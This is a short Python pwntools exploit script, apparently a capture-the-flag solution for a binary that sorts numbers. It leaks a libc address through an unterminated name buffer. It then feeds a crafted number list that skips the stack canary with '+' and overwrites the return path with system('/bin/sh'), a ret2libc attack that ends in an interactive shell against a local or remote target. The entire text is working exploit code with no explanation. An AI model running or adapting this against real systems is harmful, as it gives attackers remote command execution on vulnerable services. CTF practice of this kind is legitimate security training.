#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def write(ls):
    p.sla(',How many numbers do you what to sort :', str(len(ls)))
    for i in ls:
        p.sla('number :', str(i))

if __name__ == '__main__':
    p.sa('What your name :', 'a' * (0x4 * 7))
    p.ru('a' * (0x4 * 7))
    libc.address = u32(p.r(4)) - 0xf7fd0244 + 0xf7e22000
    success('libc ' + hex(libc.address))
    gogogo()
    ls = [0] * 0x18 + ['+']
    for i in range(8):
        ls.append(libc.sym['system'])
    ls.append(libc.sym['system'])
    ls.append(libc.search('/bin/sh').next())
    #bc(0x56555B17)
    write(ls)
    p.i()
